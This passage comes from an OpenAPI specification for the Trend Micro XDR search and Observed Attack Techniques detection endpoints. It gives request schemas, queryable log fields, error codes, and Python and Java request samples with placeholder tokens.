                ],
                "type": "object",
                "properties": {
                  "offset": {
                    "type": "integer",
                    "description": "raw log document offset (default 0)",
                    "example": 0
                  },
                  "fields": {
                    "type": "array",
                    "description": "returned fields. empty array means all fields.",
                    "items": {
                      "type": "string"
                    },
                    "default": [
                      "dpt",
                      "dst",
                      "endpointGuid",
                      "endpointHostName",
                      "endpointIp",
                      "eventId",
                      "eventSubId",
                      "eventTime",
                      "hostName",
                      "integrityLevel",
                      "logonUser",
                      "objectAppName",
                      "objectCmd",
                      "objectFileHashSha1",
                      "objectFilePath",
                      "objectHostName",
                      "objectIntegrityLevel",
                      "objectIp",
                      "objectIps",
                      "objectPid",
                      "objectPort",
                      "objectProcessHashId",
                      "objectRawDataStr",
                      "objectRegistryData",
                      "objectRegistryKeyHandle",
                      "objectRegistryValue",
                      "objectSigner",
                      "objectSignerValid",
                      "objectSubTrueType",
                      "objectTrueType",
                      "objectUser",
                      "parentCmd",
                      "parentFileHashSha1",
                      "parentFilePath",
                      "parentPid",
                      "pname",
                      "processCmd",
                      "processFileHashSha1",
                      "processFilePath",
                      "processHashId",
                      "processPid",
                      "rawDataStr",
                      "request",
                      "spt",
                      "src",
                      "srcFileHashSha1",
                      "srcFilePath",
                      "tags",
                      "winEventId",
                      "productCode",
                      "filterRiskLevel"
                    ],
                    "example": [
                      "eventTime",
                      "endpointIp",
                      "endpointHostName",
                      "objectUserDomain",
                      "spt",
                      "dpt",
                      "eventTimeDT",
                      "pname",
                      "pver",
                      "endpointGuid",
                      "userDomain"
                    ]
                  },
                  "from": {
                    "type": "integer",
                    "description": "UTC timestamp for search beginning time",
                    "example": 1587892612
                  },
                  "to": {
                    "type": "integer",
                    "description": "UTC timestamp for search ending time",
                    "example": 1592382065
                  },
                  "source": {
                    "type": "string",
                    "description": "Which Datalake, available values\n  - endpointActivityData\n  - messageActivityData\n  - detections\n  - networkActivityData\n",
                    "example": "detections"
                  },
                  "query": {
                    "type": "string",
                    "description": "search query string\n\n      Message Activity Data field available list\n        - sender\n        - subject\n        - mailbox\n        - url\n        - recipient\n        - source_domain\n        - source_ip\n        - file_sha1\n        - message_id\n        - file_extension\n        - file_name\n\n      Detection field available list\n        - hostName\n        - interestedHost\n        - objectDomain\n        - shost\n        - dhost\n        - denyListHost\n        - endpointHostName\n        - userDomain\n        - endpointGUID\n        - request\n        - botUrl\n        - cccaDestination\n        - src\n        - dst\n        - interestedIp\n        - endpointIp\n        - peerIp\n        - denyListIp\n        - dpt\n        - spt\n        - fileName\n        - objectFileName\n        - compressedFileName\n        - attachmentFileName\n        - filePath\n        - filePathName\n        - objectFilePath\n        - fileHash\n        - attachmentFileHash\n        - attachmentFileHashSha1\n        - compressedFileHash\n        - denyListFileHash\n        - objectFileHashSha1\n        - oldFileHash\n        - fileHashSha256\n        - attachmentFileHashSha256\n        - compressedFileHashSha256\n        - objectFileHashSha256\n        - attachmentFileHashMd5\n        - objectFileHashMd5\n        - processCmd\n        - objectCmd\n        - objectRegistryData\n        - objectRegistryKeyHandle\n        - objectRegistryValue\n        - suid\n        - processFilePath\n        - suser\n        - duser\n        - mailMsgSubject\n        - msgId\n        - techniqueId\n        - tags\n        - tacticId\n        - ruleName\n        - ruleId\n        - malName\n\n      Endpoint Activity Data field available list\n        - dst\n        - endpointGuid\n        - endpointHostName\n        - endpointIp\n        - eventId\n        - eventSubId\n        - hostName\n        - logonUser\n        - objectCmd\n        - objectFileHashSha1\n        - objectFilePath\n        - objectIp\n        - objectIps\n        - objectPort\n        - objectRegistryData\n        - objectRegistryKeyHandle\n        - objectRegistryValue\n        - objectSigner\n        - objectSignerValid\n        - objectUser\n        - parentCmd\n        - parentFileHashSha1\n        - parentFilePath\n        - pname\n        - processCmd\n        - processFileHashSha1\n        - processFilePath\n        - request\n        - spt\n        - dpt\n        - src\n        - srcFileHashSha1\n        - srcFilePath\n\n      Network Activity Data field available list\n        - url \n        - ip \n        - file_sha1 \n        - file_sha256 \n        - filename \n        - domain \n        - user_account \n        - ip_port\n",
                    "example": "hostName:*"
                  }
                }
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "success",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/ase-SearchResults"
                },
                "examples": {
                  "messageActivityDataExample": {
                    "$ref": "#/components/examples/ase-messageActivityDataExample"
                  },
                  "endpointActivityDataExample": {
                    "$ref": "#/components/examples/ase-endpointActivityDataExample"
                  },
                  "detectionsExample1": {
                    "$ref": "#/components/examples/ase-detectionsEndpointExample"
                  },
                  "detectionsExample2": {
                    "$ref": "#/components/examples/ase-detectionsMailExample"
                  },
                  "networkActivityDataExample": {
                    "$ref": "#/components/examples/ase-networkActivityDataExample"
                  }
                }
              }
            }
          },
          "400": {
            "description": "Bad Request",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadRequest"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Invalid HTTP Request"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "408": {
            "description": "Request timeout error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "RequestTimeout"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Request Timeout"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "Internal Server error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "InternalError"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "- Internal Server Error - content returned by service platform\n"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "599": {
            "description": "Internal Server error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "InternalError"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "- Internal Server Error - content returned by data lake\n"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/search/data'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'offset': 'YOUR_OFFSET (integer)',\n    'fields': 'YOUR_FIELDS (array)',\n    'from': 'YOUR_FROM (integer)',\n    'to': 'YOUR_TO (integer)',\n    'source': 'YOUR_SOURCE (string)',\n    'query': 'YOUR_QUERY (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/search/data\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"offset\\\": \\\"YOUR_OFFSET (integer)\\\",\" +\n                \"    \\\"fields\\\": \\\"YOUR_FIELDS (array)\\\",\" +\n                \"    \\\"from\\\": \\\"YOUR_FROM (integer)\\\",\" +\n                \"    \\\"to\\\": \\\"YOUR_TO (integer)\\\",\" +\n                \"    \\\"source\\\": \\\"YOUR_SOURCE (string)\\\",\" +\n                \"    \\\"query\\\": \\\"YOUR_QUERY (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/search/detections": {
      "post": {
        "tags": [
          "Search"
        ],
        "summary": "Search only the \"Detections\" data for matching records",
        "description": "Searches the \"Detections\" data using specified query criteria and retrieves a paginated list of matching records\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Search</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "accept-encoding",
            "description": "use gzip format",
            "example": "gzip",
            "in": "header",
            "schema": {
              "type": "string"
            }
          }
        ],
        "requestBody": {
          "description": "Search Data",
          "content": {
            "application/json": {
              "schema": {
                "required": [
                  "startTime",
                  "endTime",
                  "query"
                ],
                "type": "object",
                "properties": {
                  "offset": {
                    "type": "integer",
                    "description": "0-based (default 0, 0 means the 1st record)",
                    "example": 0
                  },
                  "limit": {
                    "type": "integer",
                    "description": "record count in one page(default 500), maximum 500",
                    "example": 100
                  },
                  "startTime": {
                    "type": "string",
                    "description": "UTC string for search beginning time",
                    "example": "2021-04-05T08:22:37Z"
                  },
                  "endTime": {
                    "type": "string",
                    "description": "UTC string for search ending time",
                    "example": "2021-04-06T08:22:37Z"
                  },
                  "query": {
                    "type": "string",
                    "description": "search query string, if query string empty, retrieves all detections log within time range\n\n      Detection data mapping link\n        - https://docs.trendmicro.com/en-us/enterprise/trend-micro-xdr-online-help/common-apps/search-app/data-mapping-detect.aspx\n\n      Detection field available list\n        - hostName\n        - interestedHost\n        - objectDomain\n        - shost\n        - dhost\n        - denyListHost\n        - endpointHostName\n        - userDomain\n        - endpointGUID\n        - request\n        - botUrl\n        - cccaDestination\n        - src\n        - dst\n        - interestedIp\n        - endpointIp\n        - peerIp\n        - denyListIp\n        - dpt\n        - spt\n        - fileName\n        - objectFileName\n        - compressedFileName\n        - attachmentFileName\n        - filePath\n        - filePathName\n        - objectFilePath\n        - fileHash\n        - attachmentFileHash\n        - attachmentFileHashSha1\n        - compressedFileHash\n        - denyListFileHash\n        - objectFileHashSha1\n        - oldFileHash\n        - fileHashSha256\n        - attachmentFileHashSha256\n        - compressedFileHashSha256\n        - objectFileHashSha256\n        - attachmentFileHashMd5\n        - objectFileHashMd5\n        - processCmd\n        - objectCmd\n        - objectRegistryData\n        - objectRegistryKeyHandle\n        - objectRegistryValue\n        - suid\n        - processFilePath\n        - suser\n        - duser\n        - mailMsgSubject\n        - msgId\n        - techniqueId\n        - tags\n        - tacticId\n        - ruleName\n        - ruleId\n        - malName\n",
                    "example": "hostName:*"
                  }
                }
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "success",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/ase-SearchDetectionsResults"
                },
                "examples": {
                  "detectionsExample1": {
                    "$ref": "#/components/examples/ase-detectionsEndpointExample"
                  },
                  "detectionsExample2": {
                    "$ref": "#/components/examples/ase-detectionsMailExample"
                  }
                }
              }
            }
          },
          "400": {
            "description": "Bad Request",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadRequest"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Invalid HTTP Request"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "408": {
            "description": "Request timeout error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "RequestTimeout"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Request Timeout"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "Internal Server error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "InternalError"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "- Internal Server Error - content returned by service platform\n"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "599": {
            "description": "Internal Server error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "InternalError"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "- Internal Server Error - content returned by data lake\n"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/search/detections'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8',\n    'accept-encoding': 'YOUR_ACCEPT-ENCODING (string)'\n}\nbody = {\n    'offset': 'YOUR_OFFSET (integer)',\n    'limit': 'YOUR_LIMIT (integer)',\n    'startTime': 'YOUR_STARTTIME (string)',\n    'endTime': 'YOUR_ENDTIME (string)',\n    'query': 'YOUR_QUERY (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/search/detections\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"offset\\\": \\\"YOUR_OFFSET (integer)\\\",\" +\n                \"    \\\"limit\\\": \\\"YOUR_LIMIT (integer)\\\",\" +\n                \"    \\\"startTime\\\": \\\"YOUR_STARTTIME (string)\\\",\" +\n                \"    \\\"endTime\\\": \\\"YOUR_ENDTIME (string)\\\",\" +\n                \"    \\\"query\\\": \\\"YOUR_QUERY (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .addHeader(\"accept-encoding\", \"YOUR_ACCEPT-ENCODING (string)\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/oat/detections": {
      "get": {
        "description": "Displays a list of Observed Attack Techniques events that match the specified criteria.\n\nNotes:\n- There are multiple ways to define the retrieval time range.\n  - Using `start` + `end`\n  - Using `ingestStart` + `ingestEnd`\n- You cannot retrieve data that is more than 365 days old.\n\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Observed Attack Techniques</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n  </ul>\n\n</div>\n",
        "summary": "Get Observed Attack Techniques events",
        "parameters": [
          {
            "name": "start",
            "description": "The start of the event detection data retrieval time range in ISO 8601 format.\n",
            "in": "query",
            "schema": {
              "type": "integer"
            },
            "example": 1588262400
          },
          {
            "name": "end",
            "description": "The end of the event detection data retrieval time range in ISO 8601 format.\n",
            "in": "query",
            "schema": {
              "type": "integer"
            },
            "example": 1597334400
          },
          {
            "name": "ingestStart",
            "description": "The start of the data ingestion time range in ISO 8601 format.\n",
            "in": "query",
            "schema": {
              "type": "integer"
            },
            "example": 1588262400
          },
          {
            "name": "ingestEnd",
            "description": "The end of the data ingestion time range in ISO 8601 format.\n",
            "in": "query",
            "schema": {
              "type": "integer"
            },
            "example": 1597334400
          },
          {
            "name": "size",
            "description": "The maximum number of records to return",
            "required": true,
            "in": "query",
            "schema": {
              "type": "integer",
              "minimum": 1,
              "maximum": 200
            },
            "example": 50
          },
          {
            "name": "riskLevels",
            "description": "The list of severity levels to include in the results",
            "in": "query",
            "schema": {
              "items": {
                "enum": [
                  "undefined",
                  "info",
                  "low",
                  "medium",
                  "high",
                  "critical"
                ]
              },
              "type": "array"
            },
            "example": [
              "high",
              "medium",
              "low"
            ]
          },
          {
            "name": "endpointName",
            "description": "The endpoint name",
            "in": "query",
            "schema": {
              "type": "string"
            },
            "example": "my-computer"
          },
          {
            "name": "containerName",
            "description": "The name of the container.\n\n> **Important\n>\n> The name of the this parameter might change depending on the products you purchase and the supported products in your region.\n",
            "in": "query",
            "schema": {
              "type": "string"
            },
            "example": "my-container"
          },
          {
            "name": "tacticIds",
            "description": "Array of tactic IDs to include in the results",
            "in": "query",
            "schema": {
              "items": {
                "type": "string"
              },
              "type": "array"
            }
          },
          {
            "name": "techniqueIds",
            "description": "Array of technique IDs to include in the results",
            "in": "query",
            "schema": {
              "items": {
                "type": "string"
              },
              "type": "array"
            }
          },
          {
            "name": "filterNames",
            "description": "Array of detection names to include or exclude (prefixed with \"-\") in the results",
            "in": "query",
            "schema": {
              "items": {
                "type": "string"
              },
              "type": "array"
            }
          },
          {
            "name": "nextBatchToken",
            "description": "Allows you to retrieve the next batch of results.",
            "in": "query",
            "schema": {
              "type": "string"
            }
          }
        ],
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "required": [
                    "info",
                    "data"
                  ],
                  "properties": {
                    "info": {
                      "type": "object",
                      "required": [
                        "message",
                        "code"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "1010000"
                        },
                        "message": {
                          "type": "string",
                          "example": "Execution successful"
                        }
                      }
                    },
                    "data": {
                      "type": "object",
                      "properties": {
                        "totalCount": {
                          "type": "integer",
                          "description": "Total count"
                        },
                        "searchApiPostData": {
                          "type": "array",
                          "items": {
                            "$ref": "#/components/schemas/ath-SearchPostData"
                          }
                        },
                        "nextBatchToken": {
                          "type": "string",
                          "description": "Encoded string used to request the subsequent events"
                        },
                        "detections": {
                          "type": "array",
                          "description": "Result list",
                          "items": {
                            "type": "object",
                            "properties": {
                              "source": {
                                "type": "string",
                                "description": "The data source of the event.\n\n> **Important**\n>\n> Data sources are determined by the products you purchase and the supported products in your region.\n",
                                "enum": [
                                  "detection",
                                  "telemetry",
                                  "containertel",
                                  "cloudtrail",
                                  "networktel",
                                  "mobiletel",
                                  "messaging",
                                  "identitytel"
                                ],
                                "example": "telemetry"
                              },
                              "uuid": {
                                "type": "string",
                                "description": "Telemetry log unique ID",
                                "example": "00000000-0000-0000-0000-000000000010"
                              },
                              "filters": {
                                "type": "array",
                                "items": {
                                  "type": "object",
                                  "properties": {
                                    "id": {
                                      "type": "string",
                                      "description": "Filter ID",
                                      "example": "F1101"
                                    },
                                    "name": {
                                      "type": "string",
                                      "description": "Detection name",
                                      "example": "Connection To Commonly Used Ports"
                                    },
                                    "description": {
                                      "type": "string",
                                      "description": "Filter description",
                                      "example": "Detects the connection to commonly used ports"
                                    },
                                    "tactics": {
                                      "type": "array",
                                      "items": {
                                        "type": "string",
                                        "description": "Filter tactic IDs"
                                      },
                                      "example": [
                                        "TA0011",
                                        "TA0020"
                                      ]
                                    },
                                    "techniques": {
                                      "type": "array",
                                      "items": {
                                        "type": "string",
                                        "description": "Filter technique IDs"
                                      },
                                      "example": [
                                        "T1042",
                                        "T1056"
                                      ]
                                    },
                                    "highlightedObjects": {
                                      "type": "array",
                                      "description": "Highlighted fields of this event",
                                      "items": {
                                        "type": "object",
                                        "properties": {
                                          "type": {
                                            "type": "string",
                                            "description": "Highlighted event type"
                                          },
                                          "field": {
                                            "type": "string",
                                            "description": "Highlighted event field name"
                                          },
                                          "value": {
                                            "oneOf": [
                                              {
                                                "type": "string",
                                                "description": "Highlighted event field value"
                                              },
                                              {
                                                "type": "integer",
                                                "description": "Highlighted event field integer value"
                                              },
                                              {
                                                "type": "array",
                                                "description": "Highlighted event field array value",
                                                "items": {
                                                  "type": "string"
                                                }
                                              }
                                            ]
                                          }
                                        }
                                      }
                                    },
                                    "level": {
                                      "type": "string",
                                      "enum": [
                                        "info",
                                        "low",
                                        "medium",
                                        "high",
                                        "critical"
                                      ],
                                      "example": "low",
                                      "description": "Filter severity"
                                    },
                                    "type": {
                                      "type": "string",
                                      "description": "The type of detection filter.",
                                      "enum": [
                                        "custom",
                                        "preset"
                                      ],
                                      "example": "custom",
                                      "default": "preset"
                                    },
                                    "unique_id": {
                                      "type": "string",
                                      "description": "Filter unique ID",
                                      "example": "b5853ce8-887a-11eb-a6a4-acde48001122"
                                    }
                                  }
                                }
                              },
                              "endpoint": {
                                "type": "object",
                                "properties": {
                                  "name": {
                                    "type": "string",
                                    "description": "Endpoint name",
                                    "example": "my-computer"
                                  },
                                  "guid": {
                                    "type": "string",
                                    "format": "uuid",
                                    "description": "Endpoint GUID"
                                  },
                                  "ips": {
                                    "type": "array",
                                    "items": {
                                      "type": "string",
                                      "format": "ip",
                                      "description": "Endpoint IP address"
                                    },
                                    "example": [
                                      "127.0.0.1",
                                      "fe80::cff:920d:4522:5efb"
                                    ]
                                  }
                                }
                              },
                              "entityType": {
                                "type": "string",
                                "description": "The type of the entity.\n\nNote: The available entity types might vary depending on the products you purchase and the supported products in your region.\n",
                                "enum": [
                                  "endpoint",
                                  "mailbox",
                                  "cloudtrail",
                                  "container",
                                  "messaging",
                                  "network",
                                  "ics",
                                  "identity"
                                ],
                                "example": "endpoint"
                              },
                              "entityName": {
                                "type": "string",
                                "description": "display name of entity",
                                "example": "desktop 1 (127.0.0.1) or 127.0.0.1 | xxxx@gmail.com | arn:aws:lambda:*:%s:function:%s | k8s_container-8c55678bd-8r7zt_default_4b291f63-c0e1-46e6-8503-ee2a834a876c_6411 | 6d7d30d2148a | -"
                              },
                              "detectionTime": {
                                "type": "string",
                                "description": "Event detection time",
                                "example": "2020-06-01T02:12:56Z"
                              },
                              "ingestionTime": {
                                "type": "string",
                                "description": "Event ingestion time",
                                "example": "2020-06-08T02:12:56Z"
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            },
            "description": "OK"
          },
          "400": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "error": {
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "1010999"
                        },
                        "message": {
                          "type": "string",
                          "example": "Invalid parameter detected. Check that all parameters are valid and try again. (Error code: 1010999)"
                        },
                        "target": {
                          "type": "string",
                          "example": "start"
                        },
                        "innererror": {
                          "type": "object",
                          "properties": {
                            "code": {
                              "type": "string",
                              "example": "InvalidIntegerValue"
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            },
            "description": "Return code and message \n * 1010400 - Validation error occurred. Check your request payload and try again. (Error code: 1010400)\n * 1010406 - Time range parameters invalid. Ensure that you have configured the start time to begin before the end time and try again. (Error code: 1010406)\n * 1010407 - nextBatchToken invalid. Ensure that you have completely copied the nextBatchToken from the previous response and try again. (Error code: 1010407)\n * 1010420 - No products connected. Connect some products and try again. (Error code: 1010420)\n * 1000520 - Request to data lake timed out. Adjust the request time range or criteria for a more precise query. (Error code: 1000520)\n * 1010550 - Request token expired. Please submit new query to get a  new token. (Error code: 1010550)\n * 1010999 - Invalid parameter detected. Check that all parameters are valid and try again. (Error code: 1010999)\n"
          },
          "429": {
            "description": "Too many requests"
          },
          "500": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "error": {
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "1009999"
                        },
                        "message": {
                          "type": "string",
                          "example": "Internal server error occurred. Please try again. If the issue persists, please contact the administrator. (Error code: 1000999)"
                        }
                      }
                    }
                  }
                }
              }
            },
            "description": "Internal server error"
          }
        },
        "tags": [
          "Observed Attack Techniques"
        ],
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/oat/detections'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'start': 'YOUR_START (integer)',\n    'end': 'YOUR_END (integer)',\n    'ingestStart': 'YOUR_INGESTSTART (integer)',\n    'ingestEnd': 'YOUR_INGESTEND (integer)',\n    'size': 'YOUR_SIZE (integer)',\n    'riskLevels': 'YOUR_RISKLEVELS (array)',\n    'endpointName': 'YOUR_ENDPOINTNAME (string)',\n    'containerName': 'YOUR_CONTAINERNAME (string)',\n    'tacticIds': 'YOUR_TACTICIDS (array)',\n    'techniqueIds': 'YOUR_TECHNIQUEIDS (array)',\n    'filterNames': 'YOUR_FILTERNAMES (array)',\n    'nextBatchToken': 'YOUR_NEXTBATCHTOKEN (string)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
